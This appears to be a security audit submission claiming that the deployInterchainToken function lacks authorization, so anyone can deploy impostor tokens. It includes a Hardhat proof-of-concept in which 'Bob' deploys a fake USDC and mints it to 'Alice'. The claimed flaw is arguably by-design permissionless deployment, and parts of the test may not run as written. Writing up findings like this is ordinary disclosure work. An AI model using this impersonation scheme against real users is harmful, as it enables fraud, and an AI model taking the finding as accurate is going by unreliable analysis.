# Vulnerability details

## The vulnerability details 
The bug is occur cause there is an absence  authorization checks in the `deployInterchainToken` function, This function is important and it's allows any user to deploy tokens without restriction, including the ability to use arbitrary names and symbols that could impersonate the legitimate tokens. and The absence of a verification check to ensure that the token being deployed is legitimate make the contract vulernbale and can be exploit by  attackers to create malicious tokens that can deceive users and lead to loss of funds :
```solidity
    function deployInterchainToken(
        bytes32 salt,
        bytes32 tokenId,
        address minter,
        string calldata name,
        string calldata symbol,
        uint8 decimals
    ) external returns (address tokenAddress) {
        // Use a minimal proxy for cheap token deployment and auto-verification on explorers
        // https://eips.ethereum.org/EIPS/eip-1167
        // The minimal proxy bytecode is the same as https://github.com/OpenZeppelin/openzeppelin-contracts/blob/94697be8a3f0dfcd95dfb13ffbd39b5973f5c65d/contracts/proxy/Clones.sol#L28
        // The minimal proxy bytecode is 0x37 = 55 bytes long
        bytes memory bytecode = new bytes(0x37);
        address implementation = implementationAddress;

        /// @solidity memory-safe-assembly
        assembly {
            // The first 0x20 = 32 bytes (0x00 - 0x19) are reserved for the length.
            // The next 0x14 = 20 bytes (0x20 - 0x33) are the ones below.
            mstore(add(bytecode, 0x20), shl(0x60, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73))
            // The next 0x14 = 20 bytes (0x34 - 0x47) are the implementation address.
            mstore(add(bytecode, 0x34), shl(0x60, implementation))
            // The last 0x0f = 15 bytes (0x48 - 0x56) are the ones below.
            mstore(add(bytecode, 0x48), shl(0x88, 0x5af43d82803e903d91602b57fd5bf3))
        }

        tokenAddress = _create3(bytecode, salt);
        if (tokenAddress.code.length == 0) revert TokenDeploymentFailed();

        IInterchainToken(tokenAddress).init(tokenId, minter, name, symbol, decimals);
    }
```
## Impact
the vulnerability is can lead that Users may be deceived into accepting or interacting with fake tokens, believing them to be legitimate due to the identical name and symbol and also Users can loss of funds if they attempt to use or trade these fake tokens, which ultimately have no value.
## Proof of Concept
i use in scenario :
- Bob deployed a fake `USDC` token with the same name `("USD Coin")` and symbol `("USDC")` as the legitimate `USDC` token.
- Fake `USDC` was deployed at address `0x33C5306f14eE641D7F0833d3e858a3f470E03646`.
- Bob minted 1000 fake `USDC` tokens and transferred them to Alice's address.
- Alice received these tokens and believed them to be legitimate.
- Alice attempted to transfer the fake `USDC`, thinking it was real, led to financial loss if she had tried to trade them on an exchange or use them in a transaction.
- use `npx hardhat test test/deployInterchainTokenPOC.js`
```solidity
const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('InterchainTokenDeployer Vulnerability PoC - User Deception and Financial Loss', function () {
    let deployer, bob, alice;
    let interchainTokenDeployer, interchainTokenImplementation;

    before(async function () {
        [deployer, bob, alice] = await ethers.getSigners();

        // Deploy the implementation contract
        const InterchainTokenFactory = await ethers.getContractFactory('InterchainToken', deployer);
        interchainTokenImplementation = await InterchainTokenFactory.deploy(deployer.address);
        await interchainTokenImplementation.deployed();
        
        // Deploy the InterchainTokenDeployer contract
        const InterchainTokenDeployerFactory = await ethers.getContractFactory('InterchainTokenDeployer', deployer);
        interchainTokenDeployer = await InterchainTokenDeployerFactory.deploy(interchainTokenImplementation.address);
        await interchainTokenDeployer.deployed();
    });

    it('Bob should be able to deploy a fake token that mimics USDC and deceive Alice', async function () {
        // Bob deploys a fake USDC token
        const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("Fake USDC"));
        const tokenId = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("USDC"));
        const tokenName = "USD Coin";
        const tokenSymbol = "USDC";
        const tokenDecimals = 6;
        const tokenMinter = bob.address;

        await interchainTokenDeployer.connect(bob).deployInterchainToken(
            salt, tokenId, tokenMinter, tokenName, tokenSymbol, tokenDecimals,
        );

        // Get the deployed fake USDC token address
        const fakeUSDCAddress = await interchainTokenDeployer.deployedAddress(salt);
        console.log(`Bob deployed Fake USDC token at address: ${fakeUSDCAddress}`);

        // Bob mints fake USDC tokens to Alice
        const FakeUSDCContract = await ethers.getContractAt('InterchainToken', fakeUSDCAddress);
        await FakeUSDCContract.connect(bob).mint(alice.address, ethers.utils.parseUnits("1000", tokenDecimals));

        // Alice checks her balance and assumes the tokens are legitimate
        const aliceBalance = await FakeUSDCContract.balanceOf(alice.address);
        console.log(`Alice received ${ethers.utils.formatUnits(aliceBalance, tokenDecimals)} fake USDC tokens from Bob.`);

        expect(aliceBalance).to.equal(ethers.utils.parseUnits("1000", tokenDecimals));

        // Alice tries to trade or use the fake USDC, thinking they are real
        try {
            await FakeUSDCContract.connect(alice).transfer(deployer.address, ethers.utils.parseUnits("500", tokenDecimals));
            console.log("Alice successfully transferred fake USDC, thinking they are real.");
        } catch (error) {
            console.log("Transfer failed, Alice may realize something is wrong.");
        }
    });
});

```
